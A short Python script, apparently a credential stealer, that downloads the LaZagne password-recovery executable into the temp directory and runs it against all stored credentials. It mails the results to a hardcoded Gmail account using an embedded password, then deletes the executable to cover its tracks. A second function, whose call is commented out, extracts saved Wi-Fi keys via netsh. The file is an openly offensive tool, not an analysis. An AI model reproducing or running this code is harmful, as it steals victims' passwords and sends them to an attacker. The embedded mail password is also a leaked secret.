#!/usr/bin/env python

import subprocess
import smtplib
import re
import requests
import tempfile
import os

PROG_NAME="Ex and Rep"
EMAIL = "ryuzaki.hcker@gmail.com"
PASSWORD = "ml2yvCuCRz7OxDWy2lgshHrWxbrlGGhRH"
SMTP_SEVER_URL = "smtp.gmail.com"
SMTP_PORT = 587
#lazagne Link
FILE_LINK = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe"


def send_email(email, password, msg, subject = "") :
      server = smtplib.SMTP(SMTP_SEVER_URL, SMTP_PORT)
      server.starttls()
      server.login(email,password)
      server.sendmail(email,email,msg)
      server.quit()


def find_wlan_passwd():
      #commande0 = "Netsh wlan show profile [SSID] key=clear"
      output = ""

      commande = "netsh wlan show profile "
      out = subprocess.check_output(commande,shell=True)
      wlans_ssid = re.findall(r"(?:Profile\s*:\s)(.*)", out)

      for ssid in wlans_ssid :
            out = subprocess.check_output(commande + ssid + " key=clear" )
            output += out 
      return output


def download_file(url):
      get_resp = requests.get(url)
      file_name = url.split("/")[-1]
      with open(file_name,"wb") as out_file:
            out_file.write(get_resp.content)
      return file_name


def delete_file(file):
      os.remove(file)

#move to temp DIR       
TEMP_DIR = tempfile.gettempdir()
os.chdir(TEMP_DIR)
file_name = download_file(FILE_LINK)

#wlans_passwd = find_wlan_passwd()
output = subprocess.check_output("laZagne.exe all",shell=True)
send_email(EMAIL, PASSWORD, output)
delete_file(file_name)